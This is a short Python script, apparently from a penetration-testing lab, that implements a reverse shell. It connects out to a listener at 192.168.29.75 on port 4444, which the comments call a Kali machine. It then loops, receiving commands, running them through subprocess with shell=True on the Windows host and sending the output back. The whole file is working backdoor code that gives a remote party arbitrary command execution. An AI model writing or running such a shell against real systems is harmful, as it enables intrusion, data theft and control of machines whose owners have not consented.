import socket
import subprocess


def execute_system_commands(command):
    return subprocess.check_output(command, shell=True)      # shell=True because our command is going to be a string not a list


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.29.75", 4444))

# we will wait for kali machine to type a command which we have to execute on windows system and send its result to kali again
while True:
    command = connection.recv(1024)
    command_result = execute_system_commands(command.decode())      # making command as a string because bytes args are not allowed in windows
    connection.send(command_result)

connection.close()




# (?:')(.*)(?:\\n')



